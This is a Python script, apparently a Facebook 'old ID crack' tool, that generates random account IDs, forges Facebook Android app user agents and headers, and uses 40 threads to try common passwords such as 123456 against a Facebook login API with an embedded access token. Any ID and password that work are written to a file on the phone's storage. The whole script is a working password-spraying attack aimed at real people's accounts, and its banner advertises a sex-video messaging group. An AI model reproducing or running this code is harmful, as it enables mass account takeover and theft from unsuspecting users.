import os
import sys
import random
import time
import requests
from rich import print
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime

version = 'VERSION 2.4'
oks = []
loop = 0

class Sort:
    @staticmethod
    def line():
        print('[green1]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

    @staticmethod
    def clear():
        os.system('clear')

    @staticmethod
    def logo():
        aci = ('[b]\n   \n[yellow1]   [spring_pink]   \n'
               '[red]   [spring_yellow]     \n'
               '[blue][spring_ref]       \n'
               '[green1][spring_blue]  \n'
               '[white]  \n'
               '[orange1]  \n'
               '[green1]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
               '[green1][🚨]OWNER          : [yellow1]ALEX ADOR \n'
               '[green1][🚨]FACEBOOK       : [yellow1]ADOR\n'
               '[green1][🚨]TOOLS          : [yellow1]OLD ID CRACK \n'
               '[green1][🚨]MASANGER GROUP :[yellow1] BANGLA SEX VIDEO\n'
               '[green1][🚨]VERSION       :[yellow1] 2.4 NEW UPDATE \n'
               '[green1]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print(aci)

    @staticmethod
    def color():
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        return random.choice(co)
user=[]
oks = []
loop = 0


month = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December'
}
today_data = str(datetime.now()).split(' ')[0].split('-')
today = today_data[2] + '\x1b[1;97m.' + month.get(today_data[1])

def ua():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    rx = random.randrange(1, 999)
    xx = (f'''Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36''')
    return xx

def Samsung():
    Anderson = random.choice([
        '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', 
        '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
    model = random.choice([
        'GT-I9505', 'SM-T835', 'SM-S901U', 'MMB29K', 'SM-S134DL', 'SM-J250F', 
        'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 
        'SM-J410G', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005'])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice([
        'com.facebook.adsmanager|MobileAdsManagerAndroid', 
        'com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android', 
        'com.facebook.mlite|MessengerLite'])
    FBAN = fb.split('|')[1]
    platform = fb.split('|')[0]
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) '
          f'[FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};'
          f'FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density={str(random.choice(range(1, 4)))}.0,width={str(random.choice(range(720, 1500)))}'
          f',height={str(random.choice(range(1500, 2000)))};FB_FW/1;]')
    return ua

def userag1():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.0.0; moto e5 plus Build/OPPS27.91-179-8-16) '
          f'[FBAN/FB4A;FBAV/{fb_v1}.0.0.50.{fb_v2};FBPN/com.facebook.katana;FBLC/es_MX;FBBV/{rdp1};'
          f'FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/{andv}.0.0;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=1.7,width=720,height=1358}};FB_FW/1;FBRV/0;]')
    return ua

def userag2():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.1.1; vivo V3Max Build/LMY47V) '
          f'[FBAN/Orca-Android;FBAV/{fb_v1}.0.0.16.{fb_v2};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{rdp1};'
          f'FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andv}.1.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=3.0,width=1080,height=1920}}')
    return
   
def main():
    Sort.clear()
    print(Sort.logo())
    print('[b][green1][A] [chartreuse1]OLD ID CLONE ')
    print('[b][green1][B] [spring_green2]CONTACT ADMIN')
    print('[b][green1][C] [spring_green2]JOIN MY MESSENGER GROUP')
    print(Sort.line())
    fast_choice = input('\x1b[38;5;196m [•] \x1b[1;92mCHOICE   \x1b[38;5;208m ⌲⌲ \x1b[38;0;196m ')
    if fast_choice in ('1', '02', 'b', 'B'):
        old()
    elif fast_choice in ('2', '02', 'a', 'A'):
        print("NOTHING")
        main()
    elif fast_choice in ('3', '03', 'c', 'C'):
        print("NOTHING")
        main()
    else:
        main()

def old():
    user = []
    Sort.clear()
    print(Sort.logo())
    
    print('[b][green1][A] [sea_green2]Crack 2011-14 Id')
    print('[b][green1][B] [spring_green1]Crack 2009-10 Id')
    print(Sort.line())
    
    ask = input('\x1b[38;1;196m\x1b[38;5;196m[•] \x1b[1;92mCHOICE \x1b[38;5;208m ⌲⌲ \x1b[38;0;196m ')
    
    if ask in ('1', '01', 'a', 'A'):
        print('[b][green1][chartreuse1][•] Selected[green1][chartreuse1]⌲⌲ Uid 2011-14')
        print(Sort.line())
        print('[b][green1][chartreuse1][•] Example[green1][chartreuse1]⌲⌲ 100000, 200000')
        
        try:
            limit = int(input('\x1b[38;1;196m\x1b[38;5;196m\x1b[1;92mCHOICE\x1b[38;5;208m ⌲⌲\x1b[38;0;196m '))
        except ValueError:
            print("Invalid input. Please enter a number.")
            return
        
        print(Sort.line())
        star = '10000'
        
        for _ in range(limit):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
        
        print('[b][green1][1] [sea_green2] FIRE METHOD ')
        print('[b][green1][2] [spring_green1] NORMAL METHOD ')
        print(Sort.line())
        
        meth = input('\x1b[38;1;196m\x1b[38;5;196m \x1b[1;92mCHOICE \x1b[38;5;208m ⌲⌲ \x1b[38;0;196m ')
        
        with ThreadPool(max_workers=40) as heron:
            Sort.clear()
            print(Sort.logo())
            print(' [b][green1]▶ [chartreuse1] TOTAL ID [green1]⌲⌲  [chartreuse1]' + str(len(user)))
            print(' [b][green1]▶ [light_green] LOGGING IDZ [green1]⌲⌲  [light_green] JUST NOW')
            print(' [b][green1]▶ [light_green] AIRPLANE MODE [green1]⌲⌲  [light_green] OFF / [red]ON')
            print(Sort.line())
            
            for mal in user:
                uid = star + mal
                heron.submit(login, uid, meth)
    
    elif ask in ('2', '02', 'b', 'B'):
        print('[b][green1][chartreuse1][•] Selected[green1][chartreuse1]⌲⌲ Uid 2011-14')
        print(Sort.line())
        print('[b][green1][chartreuse1][•] Example[green1][chartreuse1]⌲⌲ 100000, 200000')
        
        try:
            limit = int(input('\x1b[38;1;196m\x1b[38;5;196m\x1b[1;92mCHOICE\x1b[38;5;208m ⌲⌲\x1b[38;0;196m '))
        except ValueError:
            print("Invalid input. Please enter a number.")
            return
        
        print(Sort.line())
        star = '100000'
        
        for _ in range(limit):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
        
        print('[b][green1][1] [sea_green2] FIRE METHOD ')
        print('[b][green1][2] [spring_green1] NORMAL METHOD ')
        print(Sort.line())
        
        meth = input('\x1b[38;1;196m\x1b[38;5;196m \x1b[1;92mCHOICE \x1b[38;5;208m ⌲⌲ \x1b[38;0;196m ')
        
        with ThreadPool(max_workers=40) as heron:
            Sort.clear()
            print(Sort.logo())
            print(' [b][green1]▶ [chartreuse1] TOTAL ID [green1]⌲⌲  [chartreuse1]' + str(len(user)))
            print(' [b][green1]▶ [light_green] LOGGING IDZ [green1]⌲⌲  [light_green] JUST NOW')
            print(' [b][green1]▶ [light_green] AIRPLANE MODE [green1]⌲⌲  [light_green] OFF / [red]ON')
            print(Sort.line())
            
            for mal in user:
                uid = star + mal
                heron.submit(login, uid, meth)
                                        
import requests
import random
import sys

# Define `oks` and `loop` outside of the function
oks = []
loop = 0

def login(uid, meth):
    global loop
    Session = requests.session()
    sys.stdout.write(f"\r\rSERCING [{loop}] / [{len(oks)}]")
    sys.stdout.flush()
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000, 40000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': userag1(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            
            rp = Session.get(
                'https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) +
                '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled' +
                '&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler' +
                '&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true',
                headers=headers
            ).json()

            if 'session_key' in rp or 'Please Confirm Email' in str(rp):
                oks.append(uid)
                print(f"\r\r [OK ID]  {uid} | {pw}")
                with open('/sdcard/nirjon_old.txt', 'a') as f:
                    f.write(uid + '|' + pw + '\n')
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
main()